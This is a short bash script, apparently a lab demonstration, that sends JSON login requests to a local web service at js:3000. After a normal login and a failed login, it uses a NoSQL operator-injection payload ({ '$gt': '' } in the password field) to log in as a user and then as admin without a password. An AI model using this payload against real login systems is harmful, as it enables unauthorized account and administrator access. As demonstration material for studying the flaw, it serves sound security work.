#!/bin/bash

set -e

function is_web_server_available()
{
    ! curl http://js:3000 2>&1 | \
        grep 'Failed to connect.*Connection refused' >/dev/null
}

until is_web_server_available
do
    echo -e '\e[90mWeb server still starting and not available...\e[0m'
    sleep 1
done

function send()
{
  >&2 echo -e "\nSending POST data: \e[34m $1 \e[0m"

  curl -s -X POST http://js:3000 \
       -H "Content-Type: application/json" \
       -d "$1"
}

send '{ "username": "user", "password": "password" }' | \
    grep 'Welcome user' >/dev/null

echo -e "\e[32mLegal and successful login as a standard user.\e[0m"

sleep 0.5

send '{ "username": "admin", "password": "bad" }' | \
    grep 'Wrong username / password' >/dev/null

echo -e "\e[32mFailed login with a bad password.\e[0m"

sleep 0.5

send '{ "username": "user", "password": { "$gt": ""} }' | \
    grep 'Welcome user' >/dev/null

echo -e "\e[31mPwn3d, logged in as an user without password!\e[0m"

sleep 0.5

send '{ "username": "admin", "password": { "$gt": ""} }' | \
    grep 'Welcome admin' >/dev/null

echo -e "\e[31mPwn3d, logged in as an admin without password!\e[0m"
